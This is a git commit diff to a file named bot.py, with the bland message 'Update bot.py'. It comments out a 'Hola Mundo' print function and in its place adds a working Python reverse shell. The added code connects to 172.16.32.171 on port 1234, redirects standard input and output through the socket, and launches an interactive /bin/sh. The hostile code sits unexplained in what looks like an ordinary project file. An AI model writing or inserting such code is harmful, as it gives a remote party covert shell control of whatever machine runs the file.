93ae8e06c063c61d1470d914d76798ddafbb2780
AlvaroLlungarriu <34316885+AlvaroLlungarriu@users.noreply.github.com>
2024-02-02 16:50:15 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,6 +1,15 @@
 import subprocess
+import socket
+import os
 
-def run():
-    print("Hola Mundo")
-if __name__ == "__main__":
-    run()
+#def run():
+#    print("Hola Mundo")
+#if __name__ == "__main__":
+#    run()
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("172.16.32.171",1234))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
